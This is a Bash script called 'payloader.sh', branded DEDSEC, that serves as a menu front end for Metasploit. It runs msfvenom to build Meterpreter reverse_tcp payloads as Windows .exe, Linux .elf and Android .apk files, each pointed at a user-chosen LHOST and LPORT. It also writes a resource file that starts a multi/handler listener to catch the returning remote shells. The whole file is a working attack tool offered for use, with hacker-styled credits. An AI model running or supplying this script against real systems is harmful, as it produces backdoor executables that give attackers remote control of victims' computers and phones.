#!/bin/bash

### --- ENCODING:UTF-8 --- AUTHOR:DEDSEC --- LANGUAGE:BASH --- ###

YELLOW='\e[33m'
GREY='\e[90m'
UNDERLINE='\e[4m'
YELLOW_BOLD='\e[33;1m'
CYAN_BOLD='\e[36;1m'
RED_BOLD='\e[31;1m'
GREEN_BOLD='\e[32;1m'
BLUE_BOLD='\e[34;1m'

###_________Root Checker_________###
user=$(whoami)
if [[ $user == 'root' ]]; then
  resize -s 23 74
  clear
else
  echo -e $RED_BOLD"ERROR:ACCESS DENIED [NO ROOT]"
  echo -e $RED_BOLD"\t sudo $0"
  exit 1
fi

###_________CTRL + C Message_________###
trap "echo -e '$RED_BOLD Good Bye...';exit" SIGINT

function Main_Banner {
  echo -e $CYAN_BOLD '_________________  _______ _______________________________________'
  echo -e $CYAN_BOLD '___  __ \__    | \/ /__  / __  __ \__    |__  __ \__  ____/__  __ \'
  echo -e $CYAN_BOLD '__  /_/ /_  /| |_  /__  /  _  / / /_  /| |_  / / /_  __/  __  /_/ /'
  echo -e $CYAN_BOLD '_  ____/_  ___ |  / _  /___/ /_/ /_  ___ |  /_/ /_  /___  _  _, _/'
  echo -e $CYAN_BOLD '/_/     /_/  |_/_/  /_____/\____/ /_/  |_/_____/ /_____/  /_/ |_| '
  echo -e $GREY      '                                                                   V 1.0 '
  echo -e $GREY'_________________________________'$GREY'['$CYAN_BOLD'DEDSEC'$GREY']'$GREY'_________________________________'
  echo ''
}
Main_Banner

function Payload_Truck() {
  echo '    o O o'
  echo '            o O'
  echo '               o'
  echo '|^^^^^^^^^^^^^^|l___'
  echo '|    PAYLOAD     |""\___,'
  echo '|________________|__|)__|'
  echo '|(@)(@)"""**|(@)(@)**|(@)'
  echo '= = = = = = = = = = = ='
}

function output_checker() {
  if [[ -e $1 ]]; then
    echo -e $GREEN_BOLD"[!]$1 Generated And Saved To Current Directory"
    echo '[!]Returning Back To Main Menu'
  else
    echo -e $RED_BOLD'[!]Payload Not Generated'
    echo -e $GREEN_BOLD'[!]Returning Back To Main Menu'
  fi
}

function input_checker() {
  if [[ $LPORT = '' || $LHOST = '' || $File_Name = '' ]]; then
    input_status=1
    echo ''
    echo "[!]The Requirements Are Unspecified"
    echo -e $GREEN_BOLD'[!]Returning Back To Main Menu'
    sleep 2
    ./payloader.sh
  else
    input_status=0
  fi
}

###_________Main Menu_________###
echo -e $GREY'['$YELLOW'1'$GREY']'$YELLOW'-'$GREY'['$YELLOW'Generate Payloads'$GREY']'
echo -e $GREY'['$YELLOW'2'$GREY']'$YELLOW'-'$GREY'['$YELLOW'Open MSFCONSOLE'$GREY']'
echo -e $GREY'['$YELLOW'3'$GREY']'$YELLOW'-'$GREY'['$YELLOW'Start Listener'$GREY']'
echo -e $GREY'['$YELLOW'C'$GREY']'$YELLOW'-'$GREY'['$YELLOW'Credits'$GREY']'
echo -e $GREY'['$YELLOW'X'$GREY']'$YELLOW'-'$GREY'['$YELLOW'Exit'$GREY']'
echo ''
echo -e $CYAN_BOLD'>>> \c';read menu_selection
#------------------------------------------------#
case $menu_selection in
  '1' )
  ###_________Payload Generator[msfvenom]_________###
  echo -e $YELLOW_BOLD
  echo -e $GREY'['$YELLOW'1'$GREY']'$YELLOW'-'$GREY'['$YELLOW'Windows'$GREY']'
  echo -e $GREY'['$YELLOW'2'$GREY']'$YELLOW'-'$GREY'['$YELLOW'Linux'$GREY']'
  echo -e $GREY'['$YELLOW'3'$GREY']'$YELLOW'-'$GREY'['$YELLOW'Android'$GREY']'
  echo -e $GREY'['$YELLOW'X'$GREY']'$YELLOW'-'$GREY'['$YELLOW'Back To Main Menu'$GREY']'
  echo ''
  echo -e $CYAN_BOLD'>>> \c';read payload_selection
  ###_________Windows_________###
  if [[ $payload_selection == '1' ]];then
  echo -e $YELLOW_BOLD
  echo -e 'set LHOST:\c';read LHOST
  echo -e 'set LPORT:\c';read LPORT
  echo -e 'set File Name [Without Extension]:\c';read File_Name
  echo -e $GREEN_BOLD'[!]Generating Payload'
  echo -e $RED_BOLD
  Payload_Truck
  input_checker
  if [[ $input_status == '0' ]]; then
    xterm +cm -T "Payload_Generator" -e "echo -e '\e[31m';msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o $File_Name.exe;
    echo DONE;sleep 1"
    echo ''
    output_checker $File_Name.exe
    sleep 2.5
    ./payloader.sh
  fi
  #------------------------------------------------#
  ###_________Linux_________###
  elif [[ $payload_selection == '2' ]];then
  echo -e $YELLOW_BOLD
  echo -e 'set LHOST:\c';read LHOST
  echo -e 'set LPORT:\c';read LPORT
  echo -e 'set File Name [Without Extension]:\c';read File_Name
  echo -e 'set Architecture [x86 or x64]:\c';read Arch
  echo -e $GREEN_BOLD'[!]Generating Payload'
  echo -e $RED_BOLD
  Payload_Truck
  input_checker
  if [[ $input_status == '0' ]]; then
    xterm +cm -T "Payload_Generator" -e "echo -e '\e[31m';msfvenom -p linux/$Arch/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o $File_Name.elf;
    echo DONE;sleep 1"
    echo ''
    output_checker $File_Name.elf
    sleep 2.5
    ./payloader.sh
  fi
  #------------------------------------------------#
  ###_________Android_________###
  elif [[ $payload_selection == '3' ]];then
    echo -e $YELLOW_BOLD
    echo -e 'set LHOST:\c';read LHOST
    echo -e 'set LPORT:\c';read LPORT
    echo -e 'set File Name [Without Extension]:\c';read File_Name
    echo -e $GREEN_BOLD'[!]Generating Payload'
    echo -e $RED_BOLD
    Payload_Truck
    input_checker
    if [[ $input_status == '0' ]]; then
      xterm +cm -T "Payload_Generator" -e "echo -e '\e[31m';msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -o $File_Name.apk;
      echo DONE;sleep 1"
      echo ''
      output_checker $File_Name.apk
      sleep 2.5
      ./payloader.sh
    fi
  #------------------------------------------------#
  ###_________Back to Main Menu_________###
  elif [[ $payload_selection == 'X' || $payload_selection == 'x' ]];then
     ./payloader.sh
  else ###---Invalid Option---#
      echo -e $RED_BOLD'[!]Invalid Option'
      sleep 1
      ./payloader.sh
    fi  ;;
  #------------------------------------------------#
  '2' )
  ###_________MSFCONSOLE_________###
  echo -e $GREEN_BOLD'[!]Opening msfconsole'
  gnome-terminal -t MSFCONSOLE -x bash -c "msfconsole" &
  ./payloader.sh ;;
  '3' )
  ###_________Listener_________###
  echo -e $YELLOW_BOLD
  echo -e 'set LHOST:\c';read LHOST
  echo -e 'set LPORT:\c';read LPORT
  echo -e 'set Payload:\c';read Payload
  touch temp.rc
  echo use exploit/multi/handler >> temp.rc
  echo set PAYLOAD $Payload >> temp.rc
  echo set LHOST $LHOST >> temp.rc
  echo set LPORT $LPORT >> temp.rc
  echo exploit >> temp.rc
  gnome-terminal -t LISTENER -x bash -c "msfconsole -r temp.rc ; rm temp.rc" &
  ./payloader.sh ;;
  'c' | 'C' )
  clear  
  Main_Banner
  echo -e $RED_BOLD$UNDERLINE'Hack The Planet'
  echo -e $BLUE_BOLD'OMG Its DedSec!'
  echo -e $YELLOW_BOLD'YOU 4R3 N0W L3SS V4LU4BL3 TH4N TH3 D4T4 Y0U PRODUC3'
  echo -e $GREEN_BOLD'DedSec Has Given You The Truth Do What You Will'
  echo -e $CYAN_BOLD'This Script Was Written In Bash And Made With <3' ;;
  'x' | 'X' )
  echo -e $RED_BOLD'Good Bye...'
  exit 0 ;;
  * )
  echo -e $RED_BOLD'[!]Invalid Option'
  sleep 1
  ./payloader.sh ;;
esac
